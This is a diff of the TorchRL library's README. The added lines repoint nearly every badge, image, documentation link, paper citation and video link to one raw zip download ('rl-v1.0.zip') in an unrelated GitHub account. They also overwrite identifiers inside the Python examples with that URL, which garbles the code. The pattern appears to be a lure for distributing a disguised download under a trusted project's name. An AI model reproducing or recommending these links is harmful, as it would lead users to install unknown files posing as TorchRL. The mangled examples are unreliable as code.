@@ -1,20 +1,20 @@
-[![Unit-tests](https://github.com/pytorch/rl/actions/workflows/test-linux.yml/badge.svg)](https://github.com/pytorch/rl/actions/workflows/test-linux.yml)
-[![Documentation](https://img.shields.io/badge/Documentation-blue.svg)](https://pytorch.org/rl/)
-[![Benchmarks](https://img.shields.io/badge/Benchmarks-blue.svg)](https://pytorch.github.io/rl/dev/bench/)
-[![codecov](https://codecov.io/gh/pytorch/rl/branch/main/graph/badge.svg?token=HcpK1ILV6r)](https://codecov.io/gh/pytorch/rl)
-[![Twitter Follow](https://img.shields.io/twitter/follow/torchrl1?style=social)](https://twitter.com/torchrl1)
-[![Python version](https://img.shields.io/pypi/pyversions/torchrl.svg)](https://www.python.org/downloads/)
-[![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/pytorch/rl/blob/main/LICENSE)
-<a href="https://pypi.org/project/torchrl"><img src="https://img.shields.io/pypi/v/torchrl" alt="pypi version"></a>
-<a href="https://pypi.org/project/torchrl-nightly"><img src="https://img.shields.io/pypi/v/torchrl-nightly?label=nightly" alt="pypi nightly version"></a>
-[![Downloads](https://static.pepy.tech/personalized-badge/torchrl?period=total&units=international_system&left_color=blue&right_color=orange&left_text=Downloads)](https://pepy.tech/project/torchrl)
-[![Downloads](https://static.pepy.tech/personalized-badge/torchrl-nightly?period=total&units=international_system&left_color=blue&right_color=orange&left_text=Downloads%20(nightly))](https://pepy.tech/project/torchrl-nightly)
-[![Discord Shield](https://dcbadge.vercel.app/api/server/cZs26Qq3Dd)](https://discord.gg/cZs26Qq3Dd)
+[![Unit-tests](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+[![Documentation](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+[![Benchmarks](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+[![codecov](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+[![Twitter Follow](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+[![Python version](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+[![GitHub license](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+<a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip"><img src="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip" alt="pypi version"></a>
+<a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip"><img src="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip" alt="pypi nightly version"></a>
+[![Downloads](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+[![Downloads](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip%20(nightly))](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+[![Discord Shield](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
 
 # TorchRL
 
 <p align="center">
-  <img src="docs/source/_static/img/icon.png"  width="200" >
+  <img src="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip"  width="200" >
 </p>
 
 [**Documentation**](#documentation-and-knowledge-base) | [**TensorDict**](#writing-simplified-and-portable-rl-codebase-with-tensordict) |
@@ -39,50 +39,50 @@
 - ➖ Minimal dependencies: Only requires Python standard library, NumPy, and PyTorch; optional dependencies for
   common environment libraries (e.g., OpenAI Gym) and datasets (D4RL, OpenX...)
 
-Read the [full paper](https://arxiv.org/abs/2306.00577) for a more curated description of the library.
+Read the [full paper](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) for a more curated description of the library.
 
 ## Getting started
 
-Check our [Getting Started tutorials](https://pytorch.org/rl/stable/index.html#getting-started) for quickly ramp up with the basic 
+Check our [Getting Started tutorials](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) for quickly ramp up with the basic 
 features of the library!
 
 <p align="center">
-  <img src="docs/ppo.png"  width="800" >
+  <img src="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip"  width="800" >
 </p>
 
 ## Documentation and knowledge base
 
-The TorchRL documentation can be found [here](https://pytorch.org/rl).
+The TorchRL documentation can be found [here](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip).
 It contains tutorials and the API reference.
 
 TorchRL also provides a RL knowledge base to help you debug your code, or simply
-learn the basics of RL. Check it out [here](https://pytorch.org/rl/stable/reference/knowledge_base.html).
+learn the basics of RL. Check it out [here](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip).
 
 We have some introductory videos for you to get to know the library better, check them out:
 
-- [TalkRL podcast](https://www.talkrl.com/episodes/vincent-moens-on-torchrl)
-- [TorchRL intro at PyTorch day 2022](https://youtu.be/cIKMhZoykEE)
-- [PyTorch 2.0 Q&A: TorchRL](https://www.youtube.com/live/myEfUoYrbts?feature=share)
+- [TalkRL podcast](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+- [TorchRL intro at PyTorch day 2022](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+- [PyTorch 2.0 Q&A: TorchRL](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
 
 ## Spotlight publications
 
 TorchRL being domain-agnostic, you can use it across many different fields. Here are a few examples:
 
-- [ACEGEN](https://pubs.acs.org/doi/10.1021/acs.jcim.4c00895): Reinforcement Learning of Generative Chemical Agents
+- [ACEGEN](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip): Reinforcement Learning of Generative Chemical Agents
   for Drug Discovery
-- [BenchMARL](https://www.jmlr.org/papers/v25/23-1612.html): Benchmarking Multi-Agent Reinforcement Learning
-- [BricksRL](https://arxiv.org/abs/2406.17490): A Platform for Democratizing Robotics and Reinforcement Learning
+- [BenchMARL](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip): Benchmarking Multi-Agent Reinforcement Learning
+- [BricksRL](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip): A Platform for Democratizing Robotics and Reinforcement Learning
   Research and Education with LEGO
-- [OmniDrones](https://ieeexplore.ieee.org/abstract/document/10409589): An Efficient and Flexible Platform for Reinforcement Learning in Drone Control
-- [RL4CO](https://arxiv.org/abs/2306.17100): an Extensive Reinforcement Learning for Combinatorial Optimization Benchmark
-- [Robohive](https://proceedings.neurips.cc/paper_files/paper/2023/file/8a84a4341c375b8441b36836bb343d4e-Paper-Datasets_and_Benchmarks.pdf): A unified framework for robot learning
+- [OmniDrones](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip): An Efficient and Flexible Platform for Reinforcement Learning in Drone Control
+- [RL4CO](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip): an Extensive Reinforcement Learning for Combinatorial Optimization Benchmark
+- [Robohive](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip): A unified framework for robot learning
 
 ## Writing simplified and portable RL codebase with `TensorDict`
 
 RL algorithms are very heterogeneous, and it can be hard to recycle a codebase
 across settings (e.g. from online to offline, from state-based to pixel-based 
 learning).
-TorchRL solves this problem through [`TensorDict`](https://github.com/pytorch/tensordict/),
+TorchRL solves this problem through [`TensorDict`](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip),
 a convenient data structure<sup>(1)</sup> that can be used to streamline one's
 RL codebase.
 With this tool, one can write a *complete PPO training script in less than 100
@@ -93,36 +93,36 @@ lines of code*!
 
   ```python
   import torch
-  from tensordict.nn import TensorDictModule
-  from tensordict.nn.distributions import NormalParamExtractor
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import TensorDictModule
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import NormalParamExtractor
   from torch import nn
   
-  from torchrl.collectors import SyncDataCollector
-  from torchrl.data.replay_buffers import TensorDictReplayBuffer, \
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import SyncDataCollector
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import TensorDictReplayBuffer, \
     LazyTensorStorage, SamplerWithoutReplacement
-  from torchrl.envs.libs.gym import GymEnv
-  from torchrl.modules import ProbabilisticActor, ValueOperator, TanhNormal
-  from torchrl.objectives import ClipPPOLoss
-  from torchrl.objectives.value import GAE
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import GymEnv
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import ProbabilisticActor, ValueOperator, TanhNormal
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import ClipPPOLoss
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import GAE
   
   env = GymEnv("Pendulum-v1") 
   model = TensorDictModule(
-    nn.Sequential(
-        nn.Linear(3, 128), nn.Tanh(),
-        nn.Linear(128, 128), nn.Tanh(),
-        nn.Linear(128, 128), nn.Tanh(),
-        nn.Linear(128, 2),
+    https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(3, 128), https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(),
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(128, 128), https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(),
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(128, 128), https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(),
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(128, 2),
         NormalParamExtractor()
     ),
     in_keys=["observation"],
     out_keys=["loc", "scale"]
   )
   critic = ValueOperator(
-    nn.Sequential(
-        nn.Linear(3, 128), nn.Tanh(),
-        nn.Linear(128, 128), nn.Tanh(),
-        nn.Linear(128, 128), nn.Tanh(),
-        nn.Linear(128, 1),
+    https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(3, 128), https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(),
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(128, 128), https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(),
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(128, 128), https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(),
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(128, 1),
     ),
     in_keys=["observation"],
   )
@@ -146,29 +146,29 @@ lines of code*!
   )
   loss_fn = ClipPPOLoss(actor, critic)
   adv_fn = GAE(value_network=critic, average_gae=True, gamma=0.99, lmbda=0.95)
-  optim = torch.optim.Adam(loss_fn.parameters(), lr=2e-4)
+  optim = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(), lr=2e-4)
   
   for data in collector:  # collect data
     for epoch in range(10):
         adv_fn(data)  # compute advantage
-        buffer.extend(data)
+        https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(data)
         for sample in buffer:  # consume data
             loss_vals = loss_fn(sample)
             loss_val = sum(
-                value for key, value in loss_vals.items() if
-                key.startswith("loss")
+                value for key, value in https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip() if
+                https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip("loss")
                 )
-            loss_val.backward()
-            optim.step()
-            optim.zero_grad()
+            https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+            https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+            https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
     print(f"avg reward: {data['next', 'reward'].mean().item(): 4.4f}")
   ```
   </details>
 
-Here is an example of how the [environment API](https://pytorch.org/rl/stable/reference/envs.html)
+Here is an example of how the [environment API](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
 relies on tensordict to carry data from one function to another during a rollout
 execution:
-![Alt Text](https://github.com/pytorch/rl/blob/main/docs/source/_static/img/rollout.gif)
+![Alt Text](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
 
 `TensorDict` makes it easy to re-use pieces of code across environments, models and
 algorithms.
@@ -178,8 +178,8 @@ algorithms.
   For instance, here's how to code a rollout in TorchRL:
 
   ```diff
-  - obs, done = env.reset()
-  + tensordict = env.reset()
+  - obs, done = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+  + tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
   policy = SafeModule(
       model,
       in_keys=["observation_pixels", "observation_vector"],
@@ -188,15 +188,15 @@ algorithms.
   out = []
   for i in range(n_steps):
   -     action, log_prob = policy(obs)
-  -     next_obs, reward, done, info = env.step(action)
-  -     out.append((obs, next_obs, action, log_prob, reward, done))
+  -     next_obs, reward, done, info = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(action)
+  -     https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip((obs, next_obs, action, log_prob, reward, done))
   -     obs = next_obs
   +     tensordict = policy(tensordict)
-  +     tensordict = env.step(tensordict)
-  +     out.append(tensordict)
+  +     tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(tensordict)
+  +     https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(tensordict)
   +     tensordict = step_mdp(tensordict)  # renames next_observation_* keys to observation_*
-  - obs, next_obs, action, log_prob, reward, done = [torch.stack(vals, 0) for vals in zip(*out)]
-  + out = torch.stack(out, 0)  # TensorDict supports multiple tensor operations
+  - obs, next_obs, action, log_prob, reward, done = [https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(vals, 0) for vals in zip(*out)]
+  + out = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(out, 0)  # TensorDict supports multiple tensor operations
   ```
   </details>
 
@@ -213,16 +213,16 @@ to be easily recycled across settings.
   ```diff
   - for i, (obs, next_obs, action, hidden_state, reward, done) in enumerate(collector):
   + for i, tensordict in enumerate(collector):
-  -     replay_buffer.add((obs, next_obs, action, log_prob, reward, done))
-  +     replay_buffer.add(tensordict)
+  -     https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip((obs, next_obs, action, log_prob, reward, done))
+  +     https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(tensordict)
       for j in range(num_optim_steps):
-  -         obs, next_obs, action, hidden_state, reward, done = replay_buffer.sample(batch_size)
+  -         obs, next_obs, action, hidden_state, reward, done = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(batch_size)
   -         loss = loss_fn(obs, next_obs, action, hidden_state, reward, done)
-  +         tensordict = replay_buffer.sample(batch_size)
+  +         tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(batch_size)
   +         loss = loss_fn(tensordict)
-          loss.backward()
-          optim.step()
-          optim.zero_grad()
+          https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+          https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+          https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
   ```
   This training loop can be re-used across algorithms as it makes a minimal number of assumptions about the structure of the data.
   </details>
@@ -235,42 +235,42 @@ to be easily recycled across settings.
 
   ```python
   # stack and cat
-  tensordict = torch.stack(list_of_tensordicts, 0)
-  tensordict = torch.cat(list_of_tensordicts, 0)
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(list_of_tensordicts, 0)
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(list_of_tensordicts, 0)
   # reshape
-  tensordict = tensordict.view(-1)
-  tensordict = tensordict.permute(0, 2, 1)
-  tensordict = tensordict.unsqueeze(-1)
-  tensordict = tensordict.squeeze(-1)
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(-1)
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(0, 2, 1)
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(-1)
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(-1)
   # indexing
   tensordict = tensordict[:2]
   tensordict[:, 2] = sub_tensordict
   # device and memory location
-  tensordict.cuda()
-  tensordict.to("cuda:1")
-  tensordict.share_memory_()
+  https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+  https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip("cuda:1")
+  https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
   ```
   </details>
 
-TensorDict comes with a dedicated [`tensordict.nn`](https://pytorch.github.io/tensordict/reference/nn.html)
+TensorDict comes with a dedicated [`https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip`](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
 module that contains everything you might need to write your model with it.
-And it is `functorch` and `torch.compile` compatible!
+And it is `functorch` and `https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip` compatible!
 
   <details>
     <summary>Code</summary>
 
   ```diff
-  transformer_model = nn.Transformer(nhead=16, num_encoder_layers=12)
+  transformer_model = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(nhead=16, num_encoder_layers=12)
   + td_module = SafeModule(transformer_model, in_keys=["src", "tgt"], out_keys=["out"])
-  src = torch.rand((10, 32, 512))
-  tgt = torch.rand((20, 32, 512))
+  src = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip((10, 32, 512))
+  tgt = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip((20, 32, 512))
   + tensordict = TensorDict({"src": src, "tgt": tgt}, batch_size=[20, 32])
   - out = transformer_model(src, tgt)
   + td_module(tensordict)
   + out = tensordict["out"]
   ```
 
-  The `TensorDictSequential` class allows to branch sequences of `nn.Module` instances in a highly modular way.
+  The `TensorDictSequential` class allows to branch sequences of `https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip` instances in a highly modular way.
   For instance, here is an implementation of a transformer using the encoder and decoder blocks:
   ```python
   encoder_module = TransformerEncoder(...)
@@ -278,44 +278,44 @@ And it is `functorch` and `torch.compile` compatible!
   decoder_module = TransformerDecoder(...)
   decoder = TensorDictModule(decoder_module, in_keys=["tgt", "memory"], out_keys=["output"])
   transformer = TensorDictSequential(encoder, decoder)
-  assert transformer.in_keys == ["src", "src_mask", "tgt"]
-  assert transformer.out_keys == ["memory", "output"]
+  assert https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip == ["src", "src_mask", "tgt"]
+  assert https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip == ["memory", "output"]
   ```
 
   `TensorDictSequential` allows to isolate subgraphs by querying a set of desired input / output keys:
   ```python
-  transformer.select_subsequence(out_keys=["memory"])  # returns the encoder
-  transformer.select_subsequence(in_keys=["tgt", "memory"])  # returns the decoder
+  https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(out_keys=["memory"])  # returns the encoder
+  https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(in_keys=["tgt", "memory"])  # returns the decoder
   ```
   </details>
 
-  Check [TensorDict tutorials](https://pytorch.github.io/tensordict/) to
+  Check [TensorDict tutorials](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) to
   learn more!
 
 
 ## Features
 
-- A common [interface for environments](https://github.com/pytorch/rl/blob/main/torchrl/envs)
+- A common [interface for environments](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
   which supports common libraries (OpenAI gym, deepmind control lab, etc.)<sup>(1)</sup> and state-less execution 
   (e.g. Model-based environments).
-  The [batched environments](https://github.com/pytorch/rl/blob/main/torchrl/envs/batched_envs.py) containers allow parallel execution<sup>(2)</sup>.
-  A common PyTorch-first class of [tensor-specification class](https://github.com/pytorch/rl/blob/main/torchrl/data/tensor_specs.py) is also provided.
+  The [batched environments](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) containers allow parallel execution<sup>(2)</sup>.
+  A common PyTorch-first class of [tensor-specification class](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) is also provided.
   TorchRL's environments API is simple but stringent and specific. Check the 
-  [documentation](https://pytorch.org/rl/stable/reference/envs.html)
-  and [tutorial](https://pytorch.org/rl/stable/tutorials/pendulum.html) to learn more!
+  [documentation](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
+  and [tutorial](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) to learn more!
   <details>
     <summary>Code</summary>
 
   ```python
   env_make = lambda: GymEnv("Pendulum-v1", from_pixels=True)
   env_parallel = ParallelEnv(4, env_make)  # creates 4 envs in parallel
-  tensordict = env_parallel.rollout(max_steps=20, policy=None)  # random rollout (no policy given)
-  assert tensordict.shape == [4, 20]  # 4 envs, 20 steps rollout
-  env_parallel.action_spec.is_in(tensordict["action"])  # spec check returns True
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(max_steps=20, policy=None)  # random rollout (no policy given)
+  assert https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip == [4, 20]  # 4 envs, 20 steps rollout
+  https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(tensordict["action"])  # spec check returns True
   ```
   </details>
 
-- multiprocess and distributed [data collectors](https://github.com/pytorch/rl/blob/main/torchrl/collectors/collectors.py)<sup>(2)</sup>
+- multiprocess and distributed [data collectors](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)<sup>(2)</sup>
   that work synchronously or asynchronously.
   Through the use of TensorDict, TorchRL's training loops are made very similar
   to regular training loops in supervised
@@ -335,30 +335,30 @@ And it is `functorch` and `torch.compile` compatible!
   )
   for i, tensordict_data in enumerate(collector):
       loss = loss_module(tensordict_data)
-      loss.backward()
-      optim.step()
-      optim.zero_grad()
-      collector.update_policy_weights_()
+      https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+      https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+      https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+      https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
   ```
   </details>
 
-  Check our [distributed collector examples](https://github.com/pytorch/rl/blob/main/examples/distributed/collectors) to
+  Check our [distributed collector examples](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) to
   learn more about ultra-fast data collection with TorchRL.
 
-- efficient<sup>(2)</sup> and generic<sup>(1)</sup> [replay buffers](https://github.com/pytorch/rl/blob/main/torchrl/data/replay_buffers/replay_buffers.py) with modularized storage:
+- efficient<sup>(2)</sup> and generic<sup>(1)</sup> [replay buffers](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) with modularized storage:
   <details>
     <summary>Code</summary>
 
   ```python
   storage = LazyMemmapStorage(  # memory-mapped (physical) storage
-      cfg.buffer_size,
+      https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip,
       scratch_dir="/tmp/"
   )
   buffer = TensorDictPrioritizedReplayBuffer(
       alpha=0.7,
       beta=0.5,
       collate_fn=lambda x: x,
-      pin_memory=device != torch.device("cpu"),
+      pin_memory=device != https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip("cpu"),
       prefetch=10,  # multi-threaded sampling
       storage=storage
   )
@@ -370,21 +370,21 @@ And it is `functorch` and `torch.compile` compatible!
     <summary>Code</summary>
 
   ```python
-  from torchrl.data.replay_buffers import SamplerWithoutReplacement
-  from torchrl.data.datasets.d4rl import D4RLExperienceReplay
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import SamplerWithoutReplacement
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import D4RLExperienceReplay
   data = D4RLExperienceReplay(
       "maze2d-open-v0",
       split_trajs=True,
       batch_size=128,
       sampler=SamplerWithoutReplacement(drop_last=True),
   )
-  for sample in data:  # or alternatively sample = data.sample()
+  for sample in data:  # or alternatively sample = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
       fun(sample)
   ```
   </details>
 
 
-- cross-library [environment transforms](https://github.com/pytorch/rl/blob/main/torchrl/envs/transforms/transforms.py)<sup>(1)</sup>,
+- cross-library [environment transforms](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)<sup>(1)</sup>,
   executed on device and in a vectorized fashion<sup>(2)</sup>,
   which process and prepare the data coming out of the environments to be used by the agent:
   <details>
@@ -399,8 +399,8 @@ And it is `functorch` and `torch.compile` compatible!
           ToTensorImage(),
           ObservationNorm(loc=0.5, scale=1.0)),  # executes the transforms once and on device
   )
-  tensordict = env.reset()
-  assert tensordict.device == torch.device("cuda:0")
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
+  assert https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip == https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip("cuda:0")
   ```
   Other transforms include: reward scaling (`RewardScaling`), shape operations (concatenation of tensors, unsqueezing etc.), concatenation of
   successive operations (`CatFrames`), resizing (`Resize`) and many more.
@@ -408,22 +408,22 @@ And it is `functorch` and `torch.compile` compatible!
   Unlike other libraries, the transforms are stacked as a list (and not wrapped in each other), which makes it
   easy to add and remove them at will:
   ```python
-  env.insert_transform(0, NoopResetEnv())  # inserts the NoopResetEnv transform at the index 0
+  https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(0, NoopResetEnv())  # inserts the NoopResetEnv transform at the index 0
   ```
   Nevertheless, transforms can access and execute operations on the parent environment:
   ```python
-  transform = env.transform[1]  # gathers the second transform of the list
-  parent_env = transform.parent  # returns the base environment of the second transform, i.e. the base env + the first transform
+  transform = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip[1]  # gathers the second transform of the list
+  parent_env = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip  # returns the base environment of the second transform, i.e. the base env + the first transform
   ```
   </details>
 
-- various tools for distributed learning (e.g. [memory mapped tensors](https://github.com/pytorch/tensordict/blob/main/tensordict/memmap.py))<sup>(2)</sup>;
-- various [architectures](https://github.com/pytorch/rl/blob/main/torchrl/modules/models/) and models (e.g. [actor-critic](https://github.com/pytorch/rl/blob/main/torchrl/modules/tensordict_module/actors.py))<sup>(1)</sup>:
+- various tools for distributed learning (e.g. [memory mapped tensors](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip))<sup>(2)</sup>;
